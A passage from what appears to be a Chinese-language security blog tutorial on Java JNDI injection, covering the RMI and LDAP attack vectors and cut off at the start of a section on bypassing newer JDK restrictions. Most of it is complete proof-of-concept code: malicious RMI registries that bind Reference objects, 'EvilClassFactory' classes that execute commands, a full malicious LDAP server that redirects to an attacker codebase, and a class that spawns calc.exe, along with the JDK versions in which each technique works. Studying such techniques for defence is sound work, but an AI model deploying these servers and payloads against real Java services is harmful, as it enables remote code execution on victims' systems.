       env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(args.length == <span class="hljs-number">1</span>) &#123;<br>            uri = args[<span class="hljs-number">0</span>];<br>            System.out.println(<span class="hljs-string">&quot;[*]Using lookup() to fetch object with &quot;</span> + uri);<br>            ctx.lookup(uri);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&quot;</span>);<br>            ctx.lookup(<span class="hljs-string">&quot;demo&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>AServer.java，是攻击者搭建的恶意RMI注册表服务，而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1688</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">refObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClassFactory&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(refObj);<br>        System.out.println(<span class="hljs-string">&quot;[*]Binding &#x27;exp&#x27; to &#x27;rmi://127.0.0.1:1688/exp&#x27;&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;exp&quot;</span>, refObjWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后编写恶意EvilClassFactory类，目标是在客户端执行ipconfig命令，将其编译成class文件后与AServer放置于同一目录下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilClassFactory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        InputStream inputStream;<br>        <span class="hljs-keyword">try</span> &#123;<br>            inputStream = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ipconfig&quot;</span>).getInputStream();<br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bufferedInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(inputStream);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(bufferedInputStream));<br>            String linestr;<br>            <span class="hljs-keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                System.out.println(linestr);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721125235201.png" alt="image-20230721125235201"></p><p>最后小结一下，调用InitialContext.lookup()函数都有哪些类。</p><p>在RMI中调用了InitialContext.lookup()的类有：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.jta</span><span class="hljs-selector-class">.JtaTransactionManager</span><span class="hljs-selector-class">.readObject</span>()<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.rowset</span><span class="hljs-selector-class">.JdbcRowSetImpl</span><span class="hljs-selector-class">.execute</span>()<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnector</span><span class="hljs-selector-class">.connect</span>()<br>org<span class="hljs-selector-class">.hibernate</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.StatisticsService</span><span class="hljs-selector-class">.setSessionFactoryJNDIName</span>(String sfJNDIName)<br></code></pre></td></tr></table></figure><p>在LDAP中调用了InitialContext.lookup()的类有：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InitialDirContext</span>.</span></span>lookup<span class="hljs-literal">()</span><br>Spring&#x27;s <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LdapTemplate</span>.</span></span>lookup<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LdapTemplate</span>.</span></span>lookup<span class="hljs-constructor">Context()</span><br></code></pre></td></tr></table></figure><h3 id="漏洞点2——classFactoryLocation参数注入"><a href="#漏洞点2——classFactoryLocation参数注入" class="headerlink" title="漏洞点2——classFactoryLocation参数注入"></a>漏洞点2——classFactoryLocation参数注入</h3><p>前面lookup()参数注入是基于RMI客户端的，也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。</p><p>整个利用原理过程如图：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721125419319.png" alt="image-20230721125419319"></p><p>BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        System.out.println(<span class="hljs-string">&quot;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&quot;</span>);<br>        ctx.lookup(<span class="hljs-string">&quot;demo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(args.length == <span class="hljs-number">1</span>) &#123;<br>            uri = args[<span class="hljs-number">0</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            uri = <span class="hljs-string">&quot;http://127.0.0.1/demo.class&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;[*]classFactoryLocation: &quot;</span> + uri);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">refObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClassFactory&quot;</span>, uri);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(refObj);<br>        System.out.println(<span class="hljs-string">&quot;[*]Binding &#x27;demo&#x27; to &#x27;rmi://192.168.43.201:1099/demo&#x27;&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;demo&quot;</span>, refObjWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行tasklist命令并输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClassFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilClassFactory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        InputStream inputStream;<br>        <span class="hljs-keyword">try</span> &#123;<br>            inputStream = Runtime.getRuntime().exec(<span class="hljs-string">&quot;tasklist&quot;</span>).getInputStream();<br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bufferedInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(inputStream);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(bufferedInputStream));<br>            String linestr;<br>            <span class="hljs-keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                System.out.println(linestr);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721130002709.png" alt="image-20230721130002709">漏洞点3——RMI恶意远程对象</p><blockquote><p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP&#x2F;FTP&#x2F;SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：<br>RMI客户端的上下文环境允许访问远程Codebase。<br>属性 java.rmi.server.useCodebaseOnly 的值必需为false。<br>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。<br>Changelog:</p><ul><li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li><li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li></ul></blockquote><p>这种方法限制很多，不常使用，这里先搞Demo了，意义不大。</p><h3 id="漏洞点4——结合反序列化漏洞"><a href="#漏洞点4——结合反序列化漏洞" class="headerlink" title="漏洞点4——结合反序列化漏洞"></a>漏洞点4——结合反序列化漏洞</h3><p>这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。</p><p>具体的例子如Spring Framework的反序列化漏洞，原理和示例看之前的文章就OK了：《<a href="https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">由JNDI注入引发的Spring Framework反序列化漏洞</a>》</p><h2 id="LDAP攻击向量"><a href="#LDAP攻击向量" class="headerlink" title="LDAP攻击向量"></a>LDAP攻击向量</h2><p>通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。</p><h3 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h3><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的JDk版本是1.8.0_73。</p><p>LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#EvilObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>LdapClient.java，LDAP客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>            ctx.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/EvilObject&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;This is LDAP Client.&quot;</span>;<br>            <span class="hljs-comment">//System.out.println(serv.service(data));</span><br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObject.java，恶意类，执行弹出计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/./../../images/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI/image-20230721131053362.png" alt="image-20230721131053362"></p><h2 id="CORBA攻击向量"><a href="#CORBA攻击向量" class="headerlink" title="CORBA攻击向量"></a>CORBA攻击向量</h2><p>利用CORBA攻击向量进行JNDI注入的原理和RMI、LDAP是类似的，限于个人知识的匮乏，暂时写不了这章。</p><h1 id="0x03-绕过高版本JDK（8u191-）限制"><a href="#0x03-绕过高版本JDK（8u191-）限制" class="headerlink" title="0x03 绕过高版本JDK（8u191+）限制"></a>0x03 